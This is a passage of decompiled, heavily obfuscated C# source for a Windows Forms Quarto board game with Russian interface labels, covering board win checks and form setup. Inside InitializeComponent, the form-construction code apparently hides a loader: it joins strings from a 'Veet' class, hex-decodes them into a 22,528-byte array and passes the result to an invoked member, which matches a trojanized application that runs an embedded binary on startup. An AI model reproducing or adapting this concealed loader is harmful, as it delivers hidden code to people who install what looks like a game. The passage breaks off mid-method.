					if (mem[num5, 1].Dark != mem[num5, 2].Dark)
					{
						num44 = 338489224;
						num45 = 338489224;
					}
					else
					{
						num44 = 490734881;
						num45 = 490734881;
					}
					num = num44 ^ ((int)num2 * -388754667);
					continue;
				}
				case 65u:
				{
					int num41;
					if (mem[num5, 0].Dark == mem[num5, 1].Dark)
					{
						num = -1150110378;
						num41 = -1150110378;
					}
					else
					{
						num = -1616422002;
						num41 = -1616422002;
					}
					continue;
				}
				case 64u:
				{
					int num31;
					int num32;
					if (mem[0, num5].Big != mem[1, num5].Big)
					{
						num31 = 1760137048;
						num32 = 1760137048;
					}
					else
					{
						num31 = 558677834;
						num32 = 558677834;
					}
					num = num31 ^ ((int)num2 * -754699172);
					continue;
				}
				case 63u:
					if (mem[2, 2].Dark != mem[3, 3].Dark)
					{
						num = ((int)num2 * -1828326016) ^ -1423135309;
						continue;
					}
					goto IL_02c3;
				case 62u:
				{
					int num70;
					if (mem[0, 0].Dark != mem[1, 1].Dark)
					{
						num = -641292237;
						num70 = -641292237;
					}
					else
					{
						num = -197122310;
						num70 = -197122310;
					}
					continue;
				}
				case 61u:
				{
					int num60;
					int num61;
					if (mem[num5, 1].Big == mem[num5, 2].Big)
					{
						num60 = -487529078;
						num61 = -487529078;
					}
					else
					{
						num60 = -39525095;
						num61 = -39525095;
					}
					num = num60 ^ (int)(num2 * 66792102);
					continue;
				}
				case 60u:
				{
					int num62;
					int num63;
					if (mem[0, 0] != null)
					{
						num62 = -479383510;
						num63 = -479383510;
					}
					else
					{
						num62 = -580412808;
						num63 = -580412808;
					}
					num = num62 ^ (int)(num2 * 747004213);
					continue;
				}
				case 59u:
					flag3 = true;
					num = (int)(num2 * 1234507126) ^ -2109959219;
					continue;
				case 58u:
					flag3 = false;
					num = ((int)num2 * -257028740) ^ 0x55A42A56;
					continue;
				case 57u:
				{
					int num42;
					int num43;
					if (mem[1, 2].Dark != mem[2, 1].Dark)
					{
						num42 = 1576646227;
						num43 = 1576646227;
					}
					else
					{
						num42 = 384313180;
						num43 = 384313180;
					}
					num = num42 ^ (int)(num2 * 785850421);
					continue;
				}
				case 56u:
					if (mem[0, num5] != null)
					{
						num = -1203843443;
						continue;
					}
					goto IL_03f0;
				case 55u:
				{
					int num35;
					if (mem[0, 0].Point == mem[1, 1].Point)
					{
						num = -206658191;
						num35 = -206658191;
					}
					else
					{
						num = -961742380;
						num35 = -961742380;
					}
					continue;
				}
				case 54u:
				{
					int num24;
					int num25;
					if (mem[1, num5].Point != mem[2, num5].Point)
					{
						num24 = -1501985138;
						num25 = -1501985138;
					}
					else
					{
						num24 = -1189824487;
						num25 = -1189824487;
					}
					num = num24 ^ ((int)num2 * -669585808);
					continue;
				}
				case 53u:
					if (mem[2, num5] != null)
					{
						num = (int)((num2 * 453347364) ^ 0x5C5C16DE);
						continue;
					}
					goto IL_03f0;
				case 52u:
				{
					int num12;
					if (mem[0, 3].Dark == mem[1, 2].Dark)
					{
						num = -1796031103;
						num12 = -1796031103;
					}
					else
					{
						num = -1647769314;
						num12 = -1647769314;
					}
					continue;
				}
				case 51u:
					num5++;
					num = ((int)num2 * -551602688) ^ 0x5D6F9711;
					continue;
				case 50u:
					if (mem[2, 1].Big != mem[3, 0].Big)
					{
						num = (int)(num2 * 362368340) ^ -1468772442;
						continue;
					}
					goto IL_0134;
				case 49u:
				{
					int num65;
					int num66;
					if (mem[num5, 1].Point == mem[num5, 2].Point)
					{
						num65 = 1139678823;
						num66 = 1139678823;
					}
					else
					{
						num65 = 352285992;
						num66 = 352285992;
					}
					num = num65 ^ (int)(num2 * 979375593);
					continue;
				}
				case 48u:
				{
					int num58;
					int num59;
					if (mem[0, 3].Big != mem[1, 2].Big)
					{
						num58 = -938000814;
						num59 = -938000814;
					}
					else
					{
						num58 = -874137688;
						num59 = -874137688;
					}
					num = num58 ^ ((int)num2 * -994029398);
					continue;
				}
				case 46u:
				{
					int num54;
					int num55;
					if (mem[1, 1].Square != mem[2, 2].Square)
					{
						num54 = 1776355612;
						num55 = 1776355612;
					}
					else
					{
						num54 = 1938099513;
						num55 = 1938099513;
					}
					num = num54 ^ ((int)num2 * -883322626);
					continue;
				}
				case 45u:
					if (mem[2, num5].Dark != mem[3, num5].Dark)
					{
						num = ((int)num2 * -142859470) ^ -609536715;
						continue;
					}
					goto IL_0170;
				case 44u:
					if (mem[3, num5] != null)
					{
						num = (int)((num2 * 972381722) ^ 0xDF3A76A);
						continue;
					}
					goto IL_03f0;
				case 43u:
					if (mem[2, 1] != null)
					{
						num = (int)((num2 * 870578157) ^ 0x185E7562);
						continue;
					}
					goto IL_0642;
				case 42u:
					num = -1846995789;
					continue;
				case 41u:
					if (mem[1, 2].Square == mem[2, 1].Square)
					{
						num = (int)(num2 * 159447537) ^ -523996842;
						continue;
					}
					goto IL_0681;
				case 40u:
					if (mem[0, 3].Square == mem[1, 2].Square)
					{
						num = -536152973;
						continue;
					}
					goto IL_0681;
				case 39u:
					if (mem[3, 0] != null)
					{
						num = (int)(num2 * 1721471460) ^ -281750862;
						continue;
					}
					goto IL_0642;
				case 38u:
				{
					int num36;
					int num37;
					if (flag2)
					{
						num36 = -1032106823;
						num37 = -1032106823;
					}
					else
					{
						num36 = -850727136;
						num37 = -850727136;
					}
					num = num36 ^ (int)(num2 * 1427936975);
					continue;
				}
				case 37u:
				{
					int num29;
					int num30;
					if (mem[1, num5].Dark == mem[2, num5].Dark)
					{
						num29 = 627623115;
						num30 = 627623115;
					}
					else
					{
						num29 = 848868809;
						num30 = 848868809;
					}
					num = num29 ^ ((int)num2 * -977141730);
					continue;
				}
				case 36u:
				{
					int num22;
					int num23;
					if (mem[num5, 1].Square != mem[num5, 2].Square)
					{
						num22 = -911104994;
						num23 = -911104994;
					}
					else
					{
						num22 = -1524644569;
						num23 = -1524644569;
					}
					num = num22 ^ ((int)num2 * -670487286);
					continue;
				}
				case 35u:
				{
					int num18;
					int num19;
					if (mem[1, 1].Point != mem[2, 2].Point)
					{
						num18 = -1078284872;
						num19 = -1078284872;
					}
					else
					{
						num18 = -593465071;
						num19 = -593465071;
					}
					num = num18 ^ ((int)num2 * -1673949940);
					continue;
				}
				case 34u:
				{
					int num11;
					if (mem[num5, 0].Point != mem[num5, 1].Point)
					{
						num = -1092593815;
						num11 = -1092593815;
					}
					else
					{
						num = -1045794143;
						num11 = -1045794143;
					}
					continue;
				}
				case 33u:
				{
					int num6;
					int num7;
					if (flag)
					{
						num6 = 1808244724;
						num7 = 1808244724;
					}
					else
					{
						num6 = 822542029;
						num7 = 822542029;
					}
					num = num6 ^ (int)(num2 * 1642223241);
					continue;
				}
				case 32u:
					num5 = 0;
					num = ((int)num2 * -948019819) ^ -253614233;
					continue;
				case 31u:
					flag2 = num5 < 4;
					num = -1962896964;
					continue;
				case 30u:
				{
					int num71;
					if (mem[0, num5].Dark == mem[1, num5].Dark)
					{
						num = -375196955;
						num71 = -375196955;
					}
					else
					{
						num = -686960593;
						num71 = -686960593;
					}
					continue;
				}
				case 29u:
				{
					int num67;
					if (mem[num5, 0].Square != mem[num5, 1].Square)
					{
						num = -1697270166;
						num67 = -1697270166;
					}
					else
					{
						num = -1305701814;
						num67 = -1305701814;
					}
					continue;
				}
				case 28u:
				{
					int num64;
					if (mem[0, 3].Point != mem[1, 2].Point)
					{
						num = -925964682;
						num64 = -925964682;
					}
					else
					{
						num = -612376754;
						num64 = -612376754;
					}
					continue;
				}
				case 27u:
					if (mem[2, 2].Big != mem[3, 3].Big)
					{
						num = (int)((num2 * 1858205493) ^ 0x75B4F7BB);
						continue;
					}
					goto IL_02c3;
				case 26u:
				{
					int num56;
					int num57;
					if (mem[0, 0].Big == mem[1, 1].Big)
					{
						num56 = -518005280;
						num57 = -518005280;
					}
					else
					{
						num56 = -1210084520;
						num57 = -1210084520;
					}
					num = num56 ^ (int)(num2 * 1417558262);
					continue;
				}
				case 25u:
				{
					int num50;
					int num51;
					if (mem[num5, 0] == null)
					{
						num50 = 859413876;
						num51 = 859413876;
					}
					else
					{
						num50 = 1101962503;
						num51 = 1101962503;
					}
					num = num50 ^ ((int)num2 * -171725714);
					continue;
				}
				case 24u:
				{
					int num48;
					int num49;
					if (mem[1, 2].Big == mem[2, 1].Big)
					{
						num48 = -1219668942;
						num49 = -1219668942;
					}
					else
					{
						num48 = -110102802;
						num49 = -110102802;
					}
					num = num48 ^ ((int)num2 * -44069632);
					continue;
				}
				case 23u:
					if (mem[1, 2] != null)
					{
						num = (int)(num2 * 588130300) ^ -2014401271;
						continue;
					}
					goto IL_0642;
				case 22u:
					if (mem[0, 3] != null)
					{
						num = -1606057807;
						continue;
					}
					goto IL_0642;
				case 21u:
					if (mem[2, 2].Point != mem[3, 3].Point)
					{
						num = ((int)num2 * -320263762) ^ -130209742;
						continue;
					}
					goto IL_02c3;
				case 20u:
				{
					int num46;
					int num47;
					if (!flag4)
					{
						num46 = -1363230525;
						num47 = -1363230525;
					}
					else
					{
						num46 = -1229334677;
						num47 = -1229334677;
					}
					num = num46 ^ ((int)num2 * -766109837);
					continue;
				}
				case 19u:
					if (mem[1, num5].Square == mem[2, num5].Square)
					{
						num = (int)((num2 * 129289504) ^ 0xCD5D284);
						continue;
					}
					goto IL_0a85;
				case 18u:
					if (mem[num5, 2].Point != mem[num5, 3].Point)
					{
						num = (int)((num2 * 999543180) ^ 0x631AA901);
						continue;
					}
					goto IL_0aba;
				case 17u:
					if (mem[2, 1].Point != mem[3, 0].Point)
					{
						num = ((int)num2 * -2083689389) ^ -560164545;
						continue;
					}
					goto IL_0134;
				case 16u:
					if (mem[num5, 2].Big != mem[num5, 3].Big)
					{
						num = ((int)num2 * -745940081) ^ -838929261;
						continue;
					}
					goto IL_0aba;
				case 15u:
					if (mem[num5, 2].Dark != mem[num5, 3].Dark)
					{
						num = ((int)num2 * -995773325) ^ 0x7878AF63;
						continue;
					}
					goto IL_0aba;
				case 14u:
					if (mem[2, num5].Big != mem[3, num5].Big)
					{
						num = (int)((num2 * 1509515073) ^ 0x4A5DE0F0);
						continue;
					}
					goto IL_0170;
				case 13u:
				{
					int num39;
					int num40;
					if (mem[2, 2] == null)
					{
						num39 = 979583468;
						num40 = 979583468;
					}
					else
					{
						num39 = 568017069;
						num40 = 568017069;
					}
					num = num39 ^ (int)(num2 * 590623712);
					continue;
				}
				case 12u:
				{
					int num33;
					int num34;
					if (mem[1, 1] != null)
					{
						num33 = 454867865;
						num34 = 454867865;
					}
					else
					{
						num33 = 370447408;
						num34 = 370447408;
					}
					num = num33 ^ ((int)num2 * -367578326);
					continue;
				}
				case 11u:
					num10 = ((mem[2, 1].Square == mem[3, 0].Square) ? 1 : 0);
					goto IL_0135;
				case 10u:
				{
					int num27;
					int num28;
					if (mem[num5, 0].Big != mem[num5, 1].Big)
					{
						num27 = 1264360243;
						num28 = 1264360243;
					}
					else
					{
						num27 = 425399597;
						num28 = 425399597;
					}
					num = num27 ^ (int)(num2 * 1755309021);
					continue;
				}
				case 9u:
					if (mem[1, num5] != null)
					{
						num = (int)((num2 * 659874056) ^ 0x606620DB);
						continue;
					}
					goto IL_03f0;
				case 8u:
					if (mem[0, num5].Square == mem[1, num5].Square)
					{
						num = -1668322621;
						continue;
					}
					goto IL_0a85;
				case 7u:
				{
					int num20;
					int num21;
					if (mem[num5, 1] == null)
					{
						num20 = 981242732;
						num21 = 981242732;
					}
					else
					{
						num20 = 1098078860;
						num21 = 1098078860;
					}
					num = num20 ^ ((int)num2 * -828757946);
					continue;
				}
				case 6u:
				{
					int num16;
					int num17;
					if (mem[1, num5].Big != mem[2, num5].Big)
					{
						num16 = -565743428;
						num17 = -565743428;
					}
					else
					{
						num16 = -1806669708;
						num17 = -1806669708;
					}
					num = num16 ^ (int)(num2 * 188641310);
					continue;
				}
				case 5u:
					if (mem[2, 2].Square != mem[3, 3].Square)
					{
						num = ((int)num2 * -2142575377) ^ -221114413;
						continue;
					}
					goto IL_02c3;
				case 4u:
					num13 = ((mem[2, num5].Square == mem[3, num5].Square) ? 1 : 0);
					goto IL_0171;
				case 3u:
					result = flag3;
					num = -389555405;
					continue;
				case 2u:
				{
					int num8;
					int num9;
					if (mem[1, 1].Big == mem[2, 2].Big)
					{
						num8 = -2090917185;
						num9 = -2090917185;
					}
					else
					{
						num8 = -1770982168;
						num9 = -1770982168;
					}
					num = num8 ^ (int)(num2 * 1654816874);
					continue;
				}
				case 1u:
					if (mem[num5, 2].Square != mem[num5, 3].Square)
					{
						num = ((int)num2 * -254842559) ^ -1166202047;
						continue;
					}
					goto IL_0aba;
				case 0u:
				{
					int num3;
					int num4;
					if (mem[1, 1].Dark == mem[2, 2].Dark)
					{
						num3 = -1274574823;
						num4 = -1274574823;
					}
					else
					{
						num3 = -622864269;
						num4 = -622864269;
					}
					num = num3 ^ (int)(num2 * 1594444832);
					continue;
				}
				case 70u:
					break;
				default:
					{
						return result;
					}
					IL_0134:
					num10 = 1;
					goto IL_0135;
					IL_02c3:
					num10 = 1;
					goto IL_0135;
					IL_03f0:
					num13 = 0;
					goto IL_0171;
					IL_0170:
					num13 = 1;
					goto IL_0171;
					IL_0aba:
					num13 = 1;
					goto IL_0171;
					IL_0a85:
					num13 = 0;
					goto IL_0171;
					IL_0681:
					num10 = 0;
					goto IL_0135;
					IL_0642:
					num10 = 0;
					goto IL_0135;
					IL_0171:
					flag = (byte)num13 != 0;
					num = -79169919;
					continue;
					IL_0135:
					flag4 = (byte)num10 != 0;
					num = -763076604;
					continue;
				}
				break;
			}
		}
	}

	private bool Standoff(Figurine[,] mem)
	{
		bool flag2 = default(bool);
		bool result = default(bool);
		bool flag3 = default(bool);
		int num6 = default(int);
		int num5 = default(int);
		bool flag = default(bool);
		while (true)
		{
			int num = 1050065148;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x6843D6B5u) % 15u)
				{
				case 14u:
				{
					int num8;
					int num9;
					if (flag2)
					{
						num8 = 686665431;
						num9 = 686665431;
					}
					else
					{
						num8 = 85971329;
						num9 = 85971329;
					}
					num = num8 ^ (int)(num2 * 3585721);
					continue;
				}
				case 13u:
					result = flag3;
					num = ((int)num2 * -472971988) ^ 0x6A7FEF57;
					continue;
				case 12u:
					num6++;
					num = 1219727061;
					continue;
				case 11u:
					num5++;
					num = ((int)num2 * -1313734380) ^ 0x52D47BB;
					continue;
				case 10u:
					flag2 = mem[num5, num6] == null;
					num = 1419489470;
					continue;
				case 9u:
				{
					int num7;
					if (num5 < 4)
					{
						num = 1735723435;
						num7 = 1735723435;
					}
					else
					{
						num = 1443136030;
						num7 = 1443136030;
					}
					continue;
				}
				case 7u:
					num6 = 0;
					num = 1219727061;
					continue;
				case 6u:
					flag = num6 < 4;
					num = 611576048;
					continue;
				case 5u:
					flag3 = false;
					num = (int)((num2 * 689950983) ^ 0x518A7B85);
					continue;
				case 3u:
					num = (int)((num2 * 1419678447) ^ 0x4012BC66);
					continue;
				case 2u:
					flag3 = true;
					num5 = 0;
					num = (int)((num2 * 1776695283) ^ 0x70E81C31);
					continue;
				case 1u:
					num = (int)(num2 * 1427436006) ^ -626827823;
					continue;
				case 0u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = 713870138;
						num4 = 713870138;
					}
					else
					{
						num3 = 1541836154;
						num4 = 1541836154;
					}
					num = num3 ^ (int)(num2 * 1470681503);
					continue;
				}
				case 8u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public void SetName(string str)
	{
		while (true)
		{
			int num = -544550268;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xA79345F9u) % 6u)
				{
				case 5u:
					num = (int)((num2 * 190077106) ^ 0x6205A0E1);
					continue;
				case 4u:
					Form1.smethod_32((Control)(object)label2, "");
					num = ((int)num2 * -1458539071) ^ -877694444;
					continue;
				case 3u:
					num = ((int)num2 * -1578153246) ^ 0x5E6DE45D;
					continue;
				case 1u:
					Form1.smethod_32((Control)(object)label5, "Игрок: ");
					Form1.smethod_32((Control)(object)label6, str);
					Form1.smethod_50((Control)(object)label5, (Form1.smethod_49((Control)(object)this) - (Form1.smethod_18((Control)(object)label5) + Form1.smethod_18((Control)(object)label6))) / 2);
					Form1.smethod_50((Control)(object)label6, Form1.smethod_37((Control)(object)label5).X + Form1.smethod_18((Control)(object)label5));
					Form1.smethod_32((Control)(object)label1, "");
					num = ((int)num2 * -1072396626) ^ 0x7929C994;
					continue;
				default:
					return;
				case 0u:
					break;
				case 2u:
					return;
				}
				break;
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing)
		{
			goto IL_0023;
		}
		int num = 0;
		goto IL_009f;
		IL_009f:
		bool flag = (byte)num != 0;
		int num2 = 2137062157;
		goto IL_0069;
		IL_0023:
		num2 = 1956219265;
		goto IL_0069;
		IL_0069:
		while (true)
		{
			uint num3;
			switch ((num3 = (uint)num2 ^ 0x2D9A9187u) % 7u)
			{
			case 6u:
				Form1.smethod_51((IDisposable)components);
				num2 = (int)(num3 * 662895746) ^ -834839283;
				continue;
			case 5u:
				break;
			case 4u:
				((Form)this).Dispose(disposing);
				num2 = 1152872615;
				continue;
			case 3u:
			{
				int num4;
				int num5;
				if (!flag)
				{
					num4 = 449132305;
					num5 = 449132305;
				}
				else
				{
					num4 = 2004302248;
					num5 = 2004302248;
				}
				num2 = num4 ^ (int)(num3 * 1297750009);
				continue;
			}
			case 2u:
				num2 = ((int)num3 * -130890908) ^ -1356207648;
				continue;
			default:
				return;
			case 1u:
				goto IL_0096;
			case 0u:
				return;
			}
			break;
		}
		goto IL_0023;
		IL_0096:
		num = ((components != null) ? 1 : 0);
		goto IL_009f;
	}

	private void InitializeComponent()
	{
		//IL_0088: Unknown result type (might be due to invalid IL or missing references)
		//IL_0092: Expected O, but got Unknown
		int num5 = default(int);
		bool flag = default(bool);
		byte[] array = default(byte[]);
		object[] object_ = default(object[]);
		string string_ = default(string);
		while (true)
		{
			int num = -1920558081;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x8F289467u) % 122u)
				{
				case 121u:
					Form1.smethod_59((Control)(object)this);
					num = (int)(num2 * 90022651) ^ -1622502677;
					continue;
				case 120u:
					Form1.smethod_61((Control)(object)panel1, "panel1");
					num = ((int)num2 * -371261017) ^ 0x4EB6BE58;
					continue;
				case 119u:
					num = (int)(num2 * 25363317) ^ -1076621847;
					continue;
				case 118u:
					num = (int)((num2 * 784843933) ^ 0x406E9B36);
					continue;
				case 117u:
					num = (int)(num2 * 1626571073) ^ -747792669;
					continue;
				case 116u:
					Form1.smethod_6((Control)(object)pictureBox1, new MouseEventHandler(PictureBox1_MouseDown));
					num = ((int)num2 * -1087519440) ^ -334854069;
					continue;
				case 115u:
					num5 = 0;
					num = ((int)num2 * -516102860) ^ 0x198BD296;
					continue;
				case 114u:
					Form1.smethod_65((Control)(object)richTextBox1, bool_0: false);
					num = (int)((num2 * 159619353) ^ 0x79895F5D);
					continue;
				case 113u:
					Form1.smethod_67((Control)(object)button2, (EventHandler)Button2_Click);
					Form1.smethod_4((Control)(object)button1, new Point(12, 275));
					num = (int)(num2 * 2099675584) ^ -1725156921;
					continue;
				case 111u:
					Form1.smethod_3((Control)(object)label6, new Size(0, 16));
					Form1.smethod_64((Control)(object)label6, 13);
					num = ((int)num2 * -1617773186) ^ 0x655B1F07;
					continue;
				case 110u:
					Form1.smethod_77((Control)(object)label5, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					Form1.smethod_4((Control)(object)label5, new Point(197, 0));
					num = (int)((num2 * 709101210) ^ 0x295E115D);
					continue;
				case 109u:
					Form1.smethod_64((Control)(object)label5, 12);
					num = ((int)num2 * -1813989980) ^ 0x5E0CE89E;
					continue;
				case 108u:
					Form1.smethod_4((Control)(object)label1, new Point(486, 0));
					num = ((int)num2 * -1256499902) ^ 0x66DA9CE3;
					continue;
				case 107u:
					num = -727800884;
					continue;
				case 106u:
					num = (int)((num2 * 373844729) ^ 0x344FCBCF);
					continue;
				case 105u:
					num = ((int)num2 * -597672739) ^ -170918595;
					continue;
				case 104u:
					Form1.smethod_74((Control)(object)label2, bool_0: true);
					num = (int)((num2 * 2056499919) ^ 0x69AB9EB8);
					continue;
				case 103u:
					Form1.smethod_3((Control)(object)label2, new Size(0, 16));
					num = ((int)num2 * -1642545780) ^ 0x37A32344;
					continue;
				case 102u:
					num5++;
					num = (int)(num2 * 842083105) ^ -770218905;
					continue;
				case 101u:
					Form1.smethod_3((Control)(object)label5, new Size(0, 16));
					num = (int)(num2 * 1679526980) ^ -1791936890;
					continue;
				case 100u:
					Form1.smethod_64((Control)(object)label2, 9);
					num = ((int)num2 * -1264460331) ^ 0x7F583750;
					continue;
				case 99u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label5);
					num = (int)((num2 * 1989497017) ^ 0x266ABE27);
					continue;
				case 98u:
					flag = num5 < 22528;
					num = -1009890850;
					continue;
				case 97u:
					Form1.smethod_87((Form)(object)this, (EventHandler)Form1_Load);
					num = (int)((num2 * 1081417804) ^ 0x5F4809D9);
					continue;
				case 96u:
					Form1.smethod_63(pictureBox1, bool_0: false);
					num = ((int)num2 * -972009123) ^ -1132147237;
					continue;
				case 95u:
					Form1.smethod_5((Control)(object)this, Color.White);
					num = ((int)num2 * -2134022113) ^ -722669645;
					continue;
				case 94u:
					Form1.smethod_4((Control)(object)button2, new Point(391, 275));
					Form1.smethod_61((Control)(object)button2, "button2");
					num = (int)((num2 * 2103998125) ^ 0x4160757C);
					continue;
				case 93u:
					Form1.smethod_32((Control)(object)this, "Quarto");
					num = (int)(num2 * 1193630526) ^ -208074773;
					continue;
				case 92u:
					Form1.smethod_77((Control)(object)label2, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					Form1.smethod_4((Control)(object)label2, new Point(0, 0));
					num = (int)((num2 * 1538264446) ^ 0x3BB28D34);
					continue;
				case 91u:
					CharArray(array, string.Empty);
					num = ((int)num2 * -899909211) ^ -1267024576;
					continue;
				case 90u:
					Form1.smethod_79((ContainerControl)(object)this, new SizeF(6f, 13f));
					num = (int)(num2 * 1088298947) ^ -898537935;
					continue;
				case 88u:
					Form1.smethod_61((Control)(object)label1, "label1");
					num = ((int)num2 * -1459969017) ^ -909229591;
					continue;
				case 87u:
					Form1.smethod_5((Control)(object)pictureBox1, Color.FromArgb(64, 32, 0));
					Form1.smethod_60(pictureBox1, (BorderStyle)2);
					num = (int)(num2 * 359440228) ^ -943350754;
					continue;
				case 86u:
					Form1.smethod_89((Control)(object)this, (EventHandler)Form1_LocationChanged);
					num = ((int)num2 * -224189656) ^ 0x2FD2BCD6;
					continue;
				case 85u:
					Form1.smethod_74((Control)(object)label1, bool_0: true);
					Form1.smethod_75((Control)(object)label1, (DockStyle)4);
					num = (int)((num2 * 1290013277) ^ 0x17FBE81B);
					continue;
				case 84u:
					Form1.smethod_32((Control)(object)button1, "Меню");
					num = ((int)num2 * -775443260) ^ 0x3165EB2C;
					continue;
				case 83u:
					Form1.smethod_85((Control)(object)this, "Form1");
					Form1.smethod_86((Form)(object)this, bool_0: false);
					num = ((int)num2 * -1943249877) ^ 0x4842D797;
					continue;
				case 82u:
					num = ((int)num2 * -930143594) ^ -480455637;
					continue;
				case 81u:
					Form1.smethod_58((ISupportInitialize)pictureBox1);
					num = ((int)num2 * -779287363) ^ 0x70F27E43;
					continue;
				case 80u:
					num = (int)((num2 * 332587136) ^ 0xD08A882);
					continue;
				case 79u:
					Form1.smethod_81((Form)(object)this, new Size(486, 319));
					num = (int)((num2 * 444495508) ^ 0x223E38AF);
					continue;
				case 78u:
					string_ = Veet.Sa;
					num = (int)(num2 * 2107535498) ^ -1566893010;
					continue;
				case 77u:
					Form1.smethod_4((Control)(object)panel1, new Point(0, 24));
					num = ((int)num2 * -1130328712) ^ 0x3F59B629;
					continue;
				case 76u:
					num = ((int)num2 * -1140272424) ^ 0x1A50BACE;
					continue;
				case 75u:
					num = ((int)num2 * -1531807030) ^ -182774811;
					continue;
				case 74u:
					num = ((int)num2 * -82498234) ^ 0x3F53D2DF;
					continue;
				case 73u:
					num = (int)(num2 * 658233881) ^ -559369570;
					continue;
				case 72u:
					Form1.smethod_3((Control)(object)label1, new Size(0, 16));
					Form1.smethod_64((Control)(object)label1, 8);
					num = (int)(num2 * 1111286323) ^ -751981961;
					continue;
				case 71u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label6);
					num = (int)(num2 * 1161557785) ^ -1446543117;
					continue;
				case 70u:
					num = (int)((num2 * 345450737) ^ 0x78F60957);
					continue;
				case 69u:
					Form1.smethod_77((Control)(object)label1, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)(num2 * 1051812428) ^ -2014100893;
					continue;
				case 68u:
					num = ((int)num2 * -1637706910) ^ 0x67AFB255;
					continue;
				case 67u:
					array[num5] = Form1.smethod_69(Form1.smethod_68(string_, num5 * 2, 2), 16);
					num = ((int)num2 * -899172037) ^ -1226145170;
					continue;
				case 66u:
					Form1.smethod_61((Control)(object)pictureBox1, "pictureBox1");
					Form1.smethod_3((Control)(object)pictureBox1, new Size(246, 246));
					num = ((int)num2 * -754310010) ^ -442676795;
					continue;
				case 65u:
					Form1.smethod_32((Control)(object)button2, "Подтвердить");
					num = (int)((num2 * 1999816561) ^ 0x478789FC);
					continue;
				case 64u:
					Form1.smethod_61((Control)(object)label6, "label6");
					num = ((int)num2 * -1287434791) ^ -857991594;
					continue;
				case 63u:
					num = (int)((num2 * 1193046908) ^ 0x774EBB9A);
					continue;
				case 62u:
					button1 = Form1.smethod_53();
					num = (int)(num2 * 1851600758) ^ -9253333;
					continue;
				case 61u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label2);
					num = (int)(num2 * 1107194797) ^ -1411961255;
					continue;
				case 60u:
					Form1.smethod_78((Control)(object)label1, (RightToLeft)0);
					num = ((int)num2 * -1041575212) ^ 0x51296921;
					continue;
				case 59u:
					Form1.smethod_3((Control)(object)button2, new Size(83, 35));
					num = ((int)num2 * -720956022) ^ 0x58FE4804;
					continue;
				case 58u:
					Form1.smethod_64((Control)(object)button1, 5);
					num = (int)(num2 * 357185616) ^ -2072665667;
					continue;
				case 57u:
					Form1.smethod_65((Control)(object)button2, bool_0: false);
					num = ((int)num2 * -1933451753) ^ -710345121;
					continue;
				case 56u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)pictureBox1);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)panel1);
					num = ((int)num2 * -343376224) ^ 0x31038322;
					continue;
				case 55u:
					Form1.smethod_5((Control)(object)richTextBox1, Color.White);
					num = (int)(num2 * 2096743773) ^ -177408084;
					continue;
				case 54u:
					Form1.smethod_74((Control)(object)label5, bool_0: true);
					num = ((int)num2 * -1013157085) ^ 0x586B0A51;
					continue;
				case 53u:
					Form1.smethod_75((Control)(object)label2, (DockStyle)3);
					num = ((int)num2 * -1113478656) ^ -321330995;
					continue;
				case 52u:
					components = Form1.smethod_52();
					num = ((int)num2 * -532765484) ^ 0x70DFA4D9;
					continue;
				case 51u:
					num = (int)(num2 * 139349590) ^ -1374216645;
					continue;
				case 50u:
					panel1 = Form1.smethod_55();
					timer1 = Form1.smethod_56(components);
					label1 = Form1.smethod_57();
					num = (int)((num2 * 1830735784) ^ 0x7DE143CC);
					continue;
				case 49u:
					Form1.smethod_4((Control)(object)label6, new Point(275, 0));
					num = ((int)num2 * -509239089) ^ 0x16BCBA84;
					continue;
				case 48u:
					pictureBox1 = Form1.smethod_2();
					num = ((int)num2 * -1632454460) ^ 0x4DE58FEA;
					continue;
				case 47u:
					Form1.smethod_66((ButtonBase)(object)button1, bool_0: true);
					Form1.smethod_67((Control)(object)button1, (EventHandler)Button1_Click);
					num = ((int)num2 * -652364166) ^ 0x24700DC4;
					continue;
				case 46u:
					Form1.smethod_77((Control)(object)label6, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -1838814537) ^ -81820256;
					continue;
				case 45u:
					label6 = Form1.smethod_57();
					num = ((int)num2 * -31386070) ^ 0x7BEDC776;
					continue;
				case 44u:
					num = (int)((num2 * 1838406150) ^ 0x57064E81);
					continue;
				case 43u:
					Form1.smethod_70(ComMember, object_);
					num = ((int)num2 * -474957980) ^ -801465318;
					continue;
				case 42u:
					richTextBox1 = Form1.smethod_54();
					num = (int)((num2 * 1972156299) ^ 0x17E300EB);
					continue;
				case 41u:
					Form1.smethod_3((Control)(object)panel1, new Size(486, 240));
					num = ((int)num2 * -566637542) ^ 0x6745779F;
					continue;
				case 40u:
					num = ((int)num2 * -1585709280) ^ -233305331;
					continue;
				case 39u:
					num = (int)(num2 * 93465807) ^ -798162131;
					continue;
				case 38u:
					num = (int)(num2 * 987725837) ^ -1132311200;
					continue;
				case 37u:
					num = (int)(num2 * 1495841634) ^ -443476086;
					continue;
				case 36u:
					Form1.smethod_64((Control)(object)button2, 4);
					num = (int)(num2 * 901888573) ^ -1092673801;
					continue;
				case 35u:
					Form1.smethod_64((Control)(object)richTextBox1, 6);
					num = ((int)num2 * -149165160) ^ -541233495;
					continue;
				case 34u:
					num = (int)((num2 * 457358992) ^ 0x3FE3D2AF);
					continue;
				case 33u:
					string_ = Form1.smethod_34(string_, Veet.Xe);
					string_ = Form1.smethod_34(string_, Veet.Zr);
					array = new byte[22528];
					num = (int)(num2 * 896380307) ^ -798437009;
					continue;
				case 32u:
					Form1.smethod_61((Control)(object)label5, "label5");
